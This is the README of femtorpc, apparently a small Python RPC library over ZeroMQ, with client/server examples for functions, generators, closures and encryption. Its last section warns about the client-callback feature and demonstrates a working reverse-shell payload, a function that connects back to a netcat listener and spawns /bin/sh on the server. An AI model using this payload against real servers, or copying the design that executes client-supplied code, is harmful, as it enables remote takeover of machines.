# femtorpc

FemtoRPC is a minimalist Remote Procedure Call (RPC) library built on ZeroMQ for network communication. It is designed to be simple, robust, and lightweight, enabling efficient interactions between remote processes, with security in mind.

# Installation

To install FemtoRPC, you can use pip to clone and install it directly from the GitHub repository:

``` bash
pip install git+https://github.com/laulin/femtorpc.git
```

# Usages
All examples are availables in examples/ but let see them in details.

## Basic
The most basic usage can be sum up with this example :

client :
``` python
from femtorpc.tcp_proxy import TCPProxy

if __name__ == "__main__":
    with TCPProxy("127.0.0.1", 6666, 100) as proxy:
        print(f"proxy.foo(1) -> {proxy.foo(1)}") 
        print(f"proxy.my_object.bar('hello') -> {proxy.my_object.reverse('hello')}") 
```

server :
``` python
from femtorpc.tcp_daemon import TCPDaemon

if __name__ == "__main__":
    daemon = TCPDaemon("127.0.0.1", 6666)
    def foo(x)->int:
        return x + 1
    
    class Stuff:
        def reverse(self, data:str)->str:
            return data[::-1]
    
    daemon.register(foo)
    stuff = Stuff()
    daemon.register(stuff, "my_object")

    try:
        while True:
            daemon.run_once(10, True)
    except KeyboardInterrupt:
        pass
    finally:
        daemon.close()
```

On the server side, we register a function (foo) and an instance of Stuff (stuff). The registration of foo is done using function name (implicit naming), meanwhile class instance need an explicite name (here my_object). This is due to the fact Stuff doesn't have ``__name__`` attribute. Explicite naming always override implicite name. 

No method or function whose name starts "_" (protected or private) can be registered. This way, if Stuff owns a method ``_do_something``, it wouldn't be exposed to client. 

## Generator as returned value

Generator is a powerful python toy, efficient for lazyness. And we love be lazy ! In FemtoRPC, generator object stay in the server side and are proxified to the client. Generators are destoyed when an exception is raised or if the proxy is closed.

For more information about generators, you can read this [guide](https://realpython.com/introduction-to-python-generators/).

client :

``` python
from femtorpc.tcp_proxy import TCPProxy

if __name__ == "__main__":
    with TCPProxy("127.0.0.1", 6666, 100) as proxy:
        for i in proxy.square(3):
            print(i)
```
server :
``` python
from femtorpc.tcp_daemon import TCPDaemon

if __name__ == "__main__":
    daemon = TCPDaemon("127.0.0.1", 6666)
    def square(x):
        for i in range(3):
            yield x**i
    
    
    daemon.register(square)

    try:
        while True:
            daemon.run_once(10, True)
    except KeyboardInterrupt:
        pass
    finally:
        daemon.close()
```

Generators also work in two way behaviour :

client :

``` python
from femtorpc.tcp_proxy import TCPProxy

if __name__ == "__main__":
    with TCPProxy("127.0.0.1", 6666, 100) as proxy:
        x = proxy.square()
        next(x) # initializing the generator
        for i in (1,2,3,0):
            print(x.send(i))
```

server :

``` python
from femtorpc.tcp_daemon import TCPDaemon

if __name__ == "__main__":
    daemon = TCPDaemon("127.0.0.1", 6666)
    def square():
        x = 1
        while True:
            x = yield x**2
    
    daemon.register(square)

    try:
        while True:
            daemon.run_once(10, True)
    except KeyboardInterrupt:
        pass
    finally:
        daemon.close()
```

## Closure as returned value

Another object that require a context is a function created and returned by another function, aka a closure. Since it needs a context, the closure is store in server side and the client only works with a proxy remote function. A remote closure stay alive while it proxy object is up.
Unlike generator, closure are not destroyed when an exception is raised.

client :

``` python
from femtorpc.tcp_proxy import TCPProxy

if __name__ == "__main__":
    with TCPProxy("127.0.0.1", 6666, 100) as proxy:
        add = proxy.build_add(4)
        print(f"inc(10) -> {add(10)}")
```

server :

``` python
from femtorpc.tcp_daemon import TCPDaemon

if __name__ == "__main__":
    daemon = TCPDaemon("127.0.0.1", 6666)
    def build_add(to_add):
        def add(value):
            return value + to_add
        return add
    
    daemon.register(build_add)

    try:
        while True:
            daemon.run_once(10, True)
    except KeyboardInterrupt:
        pass
    finally:
        daemon.close()
```

## Typing

One problem with python is about typing parameters. Well, it is not strictly a problem but on RPC it could. Moreover, it limits cases that would be a problem on the server side.

For more information about typing, you can read this [guide](https://realpython.com/python-type-checking/).

client :

``` python
from femtorpc.tcp_proxy import TCPProxy

if __name__ == "__main__":
    with TCPProxy("127.0.0.1", 6666, 100) as proxy:
        add = proxy.build_add(4)
        print(f"inc(10) -> {add(10)}")
```

server :

``` python
from femtorpc.tcp_daemon import TCPDaemon

if __name__ == "__main__":
    daemon = TCPDaemon("127.0.0.1", 6666)
    def build_add(to_add):
        def add(value):
            return value + to_add
        return add
    
    daemon.register(build_add)

    try:
        while True:
            daemon.run_once(10, True)
    except KeyboardInterrupt:
        pass
    finally:
        daemon.close()
```

## Encrypt or compress (or both)

Many unpleasant things can happen on RPC : performance, security... The way this RPC was designed allow to add layer between the RPC clockwish and the network. So you can change the serializer, add encryption and so on. But taking most common case, FemtoRPC contains a module ``serializer`` which provide
what is basically needed : compression and encryption.

Compression is done with LZ4, one of the best compression algorithm with an amazing compression/speed ratio. In the other hand, encryption is done with Fernet, a state of the art of a set of cryptographic primitives used in the [right way](https://github.com/fernet/spec/blob/master/Spec.md). The only limitation
here is you will need a 32 bytes binary key to operate. To make it short, they are many way to create a key (password based, key derivation, key exchange, random tokens, etc) and it is out of scope of this RPC. One important point : this key is called **private** key or **secret** key, because if must not be *public*. 
It must be protected and not disclosed. If the key is disclosed, your encryption will be useless anymore.

client :

``` python
from femtorpc.tcp_proxy import TCPProxy
from femtorpc.serializer import get_serializer

KEY = b"00000000000000000000000000000000"
COMPRESSED = True

if __name__ == "__main__":
    with TCPProxy("127.0.0.1", 6666, 100, **get_serializer(KEY, COMPRESSED)) as proxy:
        print(f"proxy.add(1,2) -> {proxy.add(1,2)}")

```

server :

``` python
from femtorpc.tcp_daemon import TCPDaemon
from femtorpc.serializer import get_serializer

# Obviously, b"0" is **NOT** a good key - just for example purpose only
KEY = b"00000000000000000000000000000000"
COMPRESSED = True

if __name__ == "__main__":
    daemon = TCPDaemon("127.0.0.1", 6666, **get_serializer(KEY, COMPRESSED))
    
    def add(a, b):
        return a + b
    
    daemon.register(add)

    try:
        while True:
            daemon.run_once(10, True)
    except KeyboardInterrupt:
        pass
    finally:
        daemon.close()
```

## Callback from the client side

It can tempting to use callback function provided by the client. This feature is partialy available and the restiction is about the serialization : the must be serializer-compliant. For example, an event driven callbakc, call on server side when something happen, propagated to the client is not possible. This feature,
fully implemented (EG done by pyro4) is only possible if the client create its own server to received call back from the server side and it is definitively out of scope of this library.

client :

``` python
from femtorpc.tcp_proxy import TCPProxy

if __name__ == "__main__":
    with TCPProxy("127.0.0.1", 6666, 100) as proxy:
        def reverse(x):
            return x[::-1]
            
        print(f"proxy.remote_map(reverse, ('abc', 'def')) -> {proxy.remote_map(reverse, ('abc', 'def'))}")         
```

server :

``` python
from femtorpc.tcp_daemon import TCPDaemon

if __name__ == "__main__":
    daemon = TCPDaemon("127.0.0.1", 6666)
    def remote_map(function, iterable):
        return list(map(function, iterable))
        
    daemon.register(remote_map)

    try:
        while True:
            daemon.run_once(10, True)
    except KeyboardInterrupt:
        pass
    finally:
        daemon.close()
```

Nevertheless, this pattern can be unsecure and unsafe by design. Client can push a slow function that will slowdown the server (deny of service). Moreover the client can push a malicious function that will compromise the server !

Creating CNC with netcat (nc) on 4242/TCP :

```bash
nc -lvp 4242
```

malicious client :

``` python
from femtorpc.tcp_proxy import TCPProxy

if __name__ == "__main__":
    with TCPProxy("127.0.0.1", 6666, 100) as proxy:
        def reverse_shell(x):
            import socket
            import os
            import pty
            import multiprocessing
            
            def process():
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(("127.0.0.1",4242))
                os.dup2(s.fileno(),0)
                os.dup2(s.fileno(),1)
                os.dup2(s.fileno(),2)
                
                pty.spawn("/bin/sh")
            
            p = multiprocessing.Process(target=process)
            p.start()

        # nc -lvp 4242
        proxy.remote_map(reverse_shell, [1])        
```

server :

``` python
from femtorpc.tcp_daemon import TCPDaemon

if __name__ == "__main__":
    daemon = TCPDaemon("127.0.0.1", 6666)
    def remote_map(function, iterable):
        return list(map(function, iterable))
        
    daemon.register(remote_map)

    try:
        while True:
            daemon.run_once(100, True)
    except KeyboardInterrupt:
        pass
    finally:
        daemon.close()
```

Start the netcat command (CNC), run the server and then run the client. In the netcat terminal, you have now a terminal on the server side. __You have been warned__. **Disclaimer** : obvioulsy, do **not** use such technics for illegal activities.